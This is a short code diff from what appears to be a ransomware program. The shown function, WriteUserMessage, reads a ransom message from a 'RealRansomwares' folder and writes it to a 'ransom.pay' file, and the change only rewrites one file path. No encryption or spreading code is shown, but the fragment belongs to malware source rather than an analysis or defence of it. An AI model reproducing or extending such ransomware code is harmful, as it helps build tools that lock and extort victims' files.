@@ -62,7 +62,7 @@ def GetAllFiles(dirName):
 def WriteUserMessage():
     file_name = "ransom.pay"
     file_path = os.path.join(base_path, file_name)
-    ransom_message_file = open(os.path.join(base_path, "RealRansomwares/ransom_message.txt"), 'r')
+    ransom_message_file = open("/RealRansomwares/ransom_message.txt", 'r')
     ransom_message = ransom_message_file.read()
     ransom_message_file.close()
     with open(file_path, 'w') as ransomFile:
